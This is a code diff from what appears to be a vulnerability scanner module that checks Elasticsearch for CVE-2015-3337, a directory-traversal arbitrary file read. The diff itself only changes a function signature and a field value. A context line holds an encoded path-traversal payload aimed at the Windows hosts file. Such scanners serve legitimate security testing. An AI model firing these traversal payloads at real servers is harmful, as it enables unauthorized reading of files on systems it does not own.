@@ -12,14 +12,14 @@ cve_2015_3337_payloads = [
     # {'path': '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:/Windows/System32/drivers/etc/hosts'},
 ]
 
-def cve_2015_3337_scan(self, clients):
+def cve_2015_3337_scan(clients):
     ''' 在安装了具有“site”功能的插件以后, 插件目录使用../即可向上跳转, 
         导致目录穿越漏洞, 可读取任意文件, 没有安装任意插件的elasticsearch不受影响
     '''
     client = clients.get('reqClient')
     
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'ElasticSearch',
         'vul_type': 'FileRead',
         'vul_id': 'CVE-2015-3337',
     }
